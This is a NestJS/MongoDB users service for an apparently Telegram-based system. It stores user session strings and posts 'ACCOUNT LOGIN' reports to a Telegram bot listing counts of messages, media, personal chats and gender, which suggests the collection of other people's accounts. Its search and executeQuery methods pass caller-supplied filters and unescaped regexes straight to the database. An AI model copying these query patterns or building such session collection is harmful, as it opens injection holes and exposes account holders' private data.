import { TelegramService } from './../Telegram/Telegram.service';
import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { fetchWithTimeout, ppplbot } from '../../utils';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';

@Injectable()
export class UsersService {
  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService
  ) { }

  async create(user: CreateUserDto): Promise<User> {
    const activeClientSetup = this.telegramService.getActiveClientSetup();
    console.log("New User received - ", user?.mobile);
    console.log("ActiveClientSetup::", activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
      console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
      await this.clientsService.updateClientSession(user.session)
    } else {
      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
      const newUser = new this.userModel(user);
      return newUser.save();
    }
  }

  async findAll(): Promise<User[]> {
    return this.userModel.find().exec();
  }

  async findOne(tgId: string): Promise<User> {
    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()
    if (!user) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return user;
  }

  async update(tgId: string, user: UpdateUserDto): Promise<User> {
    delete user['_id']
    const existingUser = await this.userModel.findOneAndUpdate({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
    if (!existingUser) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return existingUser;
  }

  async delete(tgId: string): Promise<void> {
    const result = await this.userModel.deleteOne({ tgId }).exec();
    if (result.deletedCount === 0) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
  }
  async search(filter: SearchUserDto): Promise<User[]> {
    if (filter.firstName) {
      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any
    }
    if (filter.twoFA !== undefined) {
      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;
    }
    console.log(filter)
    return this.userModel.find(filter).exec();
  }

  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {
    try {
      if (!query) {
        throw new BadRequestException('Query is invalid.');
      }
      const queryExec = this.userModel.find(query);

      if (sort) {
        queryExec.sort(sort);
      }

      if (limit) {
        queryExec.limit(limit);
      }

      if (skip) {
        queryExec.skip(skip);
      }

      return await queryExec.exec();
    } catch (error) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
